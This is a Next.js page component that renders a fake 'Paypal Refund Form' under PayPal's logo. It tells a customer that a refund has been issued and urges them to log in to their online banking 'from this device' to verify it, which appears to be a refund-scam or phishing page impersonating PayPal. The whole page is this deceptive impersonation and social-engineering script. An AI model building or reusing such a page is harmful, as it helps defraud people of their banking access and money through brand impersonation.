"use client";
import { useParams } from "next/navigation";
import {
    Card,
    CardContent,
    CardDescription,
    CardFooter,
    CardHeader,
    CardTitle,
} from "@/components/ui/card";
import paypal from "@/assets/paypal.png";
import { Separator } from "@/components/ui/separator";
import { Button } from "@/components/ui/button";
import { useRouter } from "next/navigation";

export default function Page() {
    const { id } = useParams();
    const router = useRouter();
    return (
        <Card className="w-full max-w-2xl mx-auto mt-10 p-4">
            <CardHeader>
                <CardContent className="flex justify-center mb-4">
                    <img src={paypal.src} alt="PayPal" className="w-56 h-30" />
                </CardContent>
                <Separator />
                <CardTitle className="font-bold text-2xl">Paypal Refund Form</CardTitle>
                <CardDescription >
                    Dear Customer,
                    <br />
                    Your Paypal Cancellation Is In Process And Your Amount Has Been Refunded Back Into Your Account. Please Log In To Your Online Banking From This Device To Verify The Transaction...<br />
                    Your Transaction Id - {id}
                </CardDescription>
                <Separator />
                <CardFooter>
                    <Button className="w-full mt-4 cursor-pointer" onClick={() => router.push(`/refund/${id}`)}>Edit Response</Button>
                </CardFooter>
            </CardHeader>

        </Card>
    )
}